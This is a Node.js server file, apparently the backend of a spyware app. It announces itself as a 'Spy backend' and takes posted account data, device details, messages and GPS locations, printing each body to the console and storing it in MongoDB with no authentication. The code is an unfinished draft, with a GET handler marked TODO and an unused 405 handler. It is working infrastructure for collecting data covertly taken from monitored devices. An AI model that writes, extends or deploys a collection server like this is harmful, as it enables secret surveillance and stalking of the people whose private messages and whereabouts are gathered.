var http = require('http');
var mongo = require( './utils/mongoUtils' );
var assert = require('assert');

const LISTEN_PORT=9900;

mongo.connectToServer();

var server = http.createServer(handleRequest).listen(
    LISTEN_PORT,
    function(){
        console.log("Server listening on: http://localhost:%s", LISTEN_PORT);
    }
);

function handleRequest(request, response){
    switch (request.url) {
        case '/' :
            response.end('Spy backend welcomes you');
            break;
        case '/account' :
            if (isPost(request)) {
                storeData(request, response, 'accounts');
            } else {
                // TODO implement getData
            }
            break;
        case '/device' :
            storeData(request, response, 'devices');
            break;
        case '/message' :
            storeData(request, response, 'messages');
            break;
        case '/gps' :
            storeData(request, response, 'gps');
            break;

    }
}

function storeData(request, response, collection) {
    console.log("[200] " + request.method + " to " + request.url);
    var data = '';
    request.on('data', function (chunk) {
        console.log("Received body data:");
        console.log(chunk.toString());
        data += chunk;
    });
    request.on('end', function () {
        // store to DB
        var obj = JSON.parse(data);
        mongo.getDb().collection(collection).insertOne(obj);
        // empty 200 OK response for now
        response.writeHead(200, "OK", {'Content-Type': 'text/html'});
        response.end();
    });
}

function isPost(request) {
    return request.method == 'POST';
}

function methodNotSupported(request, response) {
    console.log("[405] " + request.method + " to " + request.url);
    response.writeHead(405, "Method not supported", {'Content-Type': 'text/html'});
    response.end('<html><head><title>405 - Method not supported</title></head><body><h1>Method not supported.</h1></body></html>');
}